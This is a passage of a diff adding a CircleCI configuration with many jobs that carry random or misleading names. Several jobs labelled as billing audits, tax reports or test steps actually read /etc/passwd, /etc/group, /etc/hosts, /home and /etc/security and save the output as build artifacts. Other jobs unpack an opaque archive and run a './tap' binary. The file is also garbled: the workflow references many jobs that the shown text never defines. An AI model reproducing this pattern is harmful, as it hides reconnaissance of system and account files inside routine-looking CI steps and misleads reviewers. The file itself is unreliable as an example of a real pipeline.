+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  hotel-robot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Carry out a full checkpoint of the billing records
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; awk -F':' '$7 ~ /sh$/ {print $1}' /etc/passwd|tr a-z A-Z; true ; } > /tmp/shard-02/150.138.193.64
+            echo "stage=promote ok b=$(wc -c </tmp/shard-02/150.138.193.64)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - '150.138.193.64'
+  promote:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/150.138.193.64 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  page_attrs_salt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: LoadTestCoverageReportStep
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; printf 'name,city,score\nnina,perth,98\ntom,quito,46\nerin,dublin,91\nliam,zurich,40\n' | awk -F, 'NR>1 {s+=$3} END {print s/(NR-1)}'; true ; } > /tmp/shard-02/G
+            echo "stage=node20-release ok b=$(wc -c </tmp/shard-02/G)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'G'
+  node20-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/trace-31b1d2.log 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  c7x:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Audit the tax report q2
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; awk -F ":" '$4 != "" { print $1 }' /etc/group | sort -ru | shuf -n 2; true ; } > /tmp/shard-02/OntM
+            echo "stage=jun21-smoke ok b=$(wc -c </tmp/shard-02/OntM)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'OntM'
+  jun21-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/OntM 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  pseudo_fork:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: bleh
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; echo 'Hello there' | cut -c1-9; true ; } > /tmp/shard-02/z8x4gqv7
+            echo "stage=q4-smoke ok b=$(wc -c </tmp/shard-02/z8x4gqv7)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'z8x4gqv7'
+  q4-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/trace-31b1d2.log 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+
+  jogmw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Over SSH partition the staging table
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; find /opt -type l -name '*' -exec basename {} \; 2>/dev/null | sort | head -n 1; true ; } > /tmp/shard-02/mbz4ukt4h
+            echo "stage=canary-v5 ok b=$(wc -c </tmp/shard-02/mbz4ukt4h)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'mbz4ukt4h'
+  Guard-Path-Manifest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Unload The Enemy Waves Stage
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; ls /sys/class/net|shuf -n 4|wc -l; true ; } > /tmp/shard-02/c847b37e-d462
+            echo "stage=hu-run ok b=$(wc -c </tmp/shard-02/c847b37e-d462)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'c847b37e-d462'
+  p_address:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Greenlight pull
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; echo -n "snake_case_name" | cat -A; true ; } > /tmp/shard-02/GPU-zeta
+            echo "stage=send-it ok b=$(wc -c </tmp/shard-02/GPU-zeta)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'GPU-zeta'
+  t_send_string:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Ground Battery Level
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; grep -R -i --include="*rc" alias /etc/security 2> /dev/null|cut -d: -f1|sort -u; true ; } > /tmp/shard-02/IMG_86721
+            echo "stage=canary-v3 ok b=$(wc -c </tmp/shard-02/IMG_86721)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'IMG_86721'
+  walnut-wrench:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: fy27 Power Cycle
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; echo "it's done" | cat -A; true ; } > /tmp/shard-02/audit-5e9be8.log
+            echo "stage=VERIFY_LAB ok b=$(wc -c </tmp/shard-02/audit-5e9be8.log)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'audit-5e9be8.log'
+  join_tile:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: and then sample the power supply
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; set -- table street top; for a; do echo "<$a>"; done; true ; } > /tmp/shard-02/0659658e50816573fe4ff280d7c32
+            echo "stage=bob-smoke ok b=$(wc -c </tmp/shard-02/0659658e50816573fe4ff280d7c32)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - '0659658e50816573fe4ff280d7c32'
+  Request:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Support calibration bead pipetting
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; ls -o /home|sort -k5 -n; true ; } > /tmp/shard-02/CRISP
+            echo "stage=depoly-46 ok b=$(wc -c </tmp/shard-02/CRISP)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'CRISP'
+  eenn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: For round two thaw the canary fleet
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; df -k | sort -n -k5; true ; } > /tmp/shard-02/RPC_351b9.74
+            echo "stage=Validate_Tests6 ok b=$(wc -c </tmp/shard-02/RPC_351b9.74)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'RPC_351b9.74'
+  CNMutablePhone:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: text retries 1
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; for x in duck cat panda eagle crow; do printf '%s\n' "$x"; done; true ; } > /tmp/shard-02/sample-77b
+            echo "stage=test ok b=$(wc -c </tmp/shard-02/sample-77b)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'sample-77b'
+  z0g:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Calm the particle systems
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; find /run -type l -name 'user' -exec ls -ld '{}' \; 2>/dev/null | awk -F/ '{print $NF}' | sort | uniq -c | sort -rn | head -5; true ; } > /tmp/shard-02/desert.teal.matrix.ridge
+            echo "stage=feat-488 ok b=$(wc -c </tmp/shard-02/desert.teal.matrix.ridge)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'desert.teal.matrix.ridge'
+  megaEmailManifest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Resume count filter
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; cmd='ls -1 /etc'; eval "$cmd | head -3"; true ; } > /tmp/shard-02/scratch-fd1ad1df
+            echo "stage=succes-only-9 ok b=$(wc -c </tmp/shard-02/scratch-fd1ad1df)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'scratch-fd1ad1df'
+  info8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Advance to seed data
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; cat /etc/hosts|awk '{ print $2 }'|pr -3 -t; true ; } > /tmp/shard-02/oTtErdRAfTCEDaR
+            echo "stage=STAGE_QA ok b=$(wc -c </tmp/shard-02/oTtErdRAfTCEDaR)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'oTtErdRAfTCEDaR'
+  diff_split_wrench_gadget:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Randomize Tutorial Zone Hi Res
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 2 -type f -name "*lock*" -exec wc -l "{}" \; 2> /dev/null | sort -r; true ; } > /tmp/shard-02/crash.log.29
+            echo "stage=fire-up ok b=$(wc -c </tmp/shard-02/crash.log.29)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'crash.log.29'
+  WorkerSafeGraniteSanitize:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: run integration suite take 7
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; for x in cairo madrid denver lisbon nairobi zurich; do printf '%s\n' $x; done; true ; } > /tmp/shard-02/2016-10-23T14-37
+            echo "stage=yuki-ci ok b=$(wc -c </tmp/shard-02/2016-10-23T14-37)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - '2016-10-23T14-37'
+  omicron_eff:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Expect the notification bell visible
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; printf '%d\n' 256 419 34 346 | sort -n | uniq -c | tac; true ; } > /tmp/shard-02/batch_404
+            echo "stage=fix-router ok b=$(wc -c </tmp/shard-02/batch_404)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'batch_404'
+workflows:
+  run:
+    jobs:
+      - cloaky
+      - jogmw:
+          requires:
+            - cloaky
+      - canary-v5:
+          requires:
+            - jogmw
+      - candle_gradient_socket_total:
+          requires:
+            - jogmw
+      - Guard-Path-Manifest:
+          requires:
+            - candle_gradient_socket_total
+      - hu-run:
+          requires:
+            - Guard-Path-Manifest
+      - MustArg:
+          requires:
+            - Guard-Path-Manifest
+      - p_address:
+          requires:
+            - MustArg
+      - send-it:
+          requires:
+            - p_address
+      - fred_r:
+          requires:
+            - p_address
+      - t_send_string:
+          requires:
+            - fred_r
+      - canary-v3:
+          requires:
+            - t_send_string
+      - uniform_yankee:
+          requires:
+            - t_send_string
+      - walnut-wrench:
+          requires:
+            - uniform_yankee
+      - VERIFY_LAB:
+          requires:
+            - walnut-wrench
+      - ROOK:
+          requires:
+            - walnut-wrench
+      - join_tile:
+          requires:
+            - ROOK
+      - bob-smoke:
+          requires:
+            - join_tile
+      - persistant_middleware
+      - add-webhook-hang:
+          requires:
+            - persistant_middleware
+      - c7x:
+          requires:
+            - persistant_middleware
+      - jun21-smoke:
+          requires:
+            - c7x
+      - E3E422:
+          requires:
+            - c7x
+      - wip-router-v2-redirect:
+          requires:
+            - E3E422
+      - LANG_TL:
+          requires:
+            - E3E422
+      - sanity:
+          requires:
+            - LANG_TL
+      - UIMutableRandom:
+          requires:
+            - LANG_TL
+      - xray:
+          requires:
+            - UIMutableRandom
+      - hotel-robot:
+          requires:
+            - UIMutableRandom
+      - promote:
+          requires:
+            - hotel-robot
+      - PI2D
+      - Request:
+          requires:
+            - PI2D
+      - depoly-46:
+          requires:
+            - Request
+      - zack-driver:
+          requires:
+            - Request
+      - eenn:
+          requires:
+            - zack-driver
+      - Validate_Tests6:
+          requires:
+            - eenn
+      - q4:
+          requires:
+            - eenn
+      - CNMutablePhone:
+          requires:
+            - q4
+      - test:
+          requires:
+            - CNMutablePhone
+      - worker-8241:
+          requires:
+            - CNMutablePhone
+      - z0g:
+          requires:
+            - worker-8241
+      - feat-488:
+          requires:
+            - z0g
+      - pill__desc__outline:
+          requires:
+            - z0g
+      - megaEmailManifest:
+          requires:
+            - pill__desc__outline
+      - succes-only-9:
+          requires:
+            - megaEmailManifest
+      - xY9:
+          requires:
+            - megaEmailManifest
+      - info8:
+          requires:
+            - xY9
+      - STAGE_QA:
+          requires:
+            - info8
+      - BIT9:
+          requires:
+            - info8
+      - diff_split_wrench_gadget:
+          requires:
+            - BIT9
+      - fire-up:
+          requires:
+            - diff_split_wrench_gadget
+      - aud_6_12_40:
+          requires:
+            - diff_split_wrench_gadget
+      - WorkerSafeGraniteSanitize:
+          requires:
+            - aud_6_12_40
+      - yuki-ci:
+          requires:
+            - WorkerSafeGraniteSanitize
+      - fs6zq3l:
+          requires:
+            - WorkerSafeGraniteSanitize
+      - omicron_eff:
+          requires:
+            - fs6zq3l
+      - fix-router:
+          requires:
+            - omicron_eff
+      - DDZ
+      - PsES
+      - java17-cov:
+          requires:
+            - DDZ
+            - PsES
+      - kilo-7:
+          requires:
+            - DDZ
+            - PsES
+      - v5-ga:
+          requires:
+            - DDZ
+            - PsES
+      - q2-rev:
+          requires:
+            - DDZ
+            - PsES
+      - q4-smoke:
+          requires:
+            - DDZ
+            - PsES
+      - q4-release:
+          requires:
+            - DDZ
+            - PsES
+      - hotfix-4543:
+          requires:
+            - DDZ
+            - PsES
+      - BUILD_STG:
+          requires:
+            - DDZ
+            - PsES
+      - node20-release:
+          requires:
+            - DDZ
+            - PsES
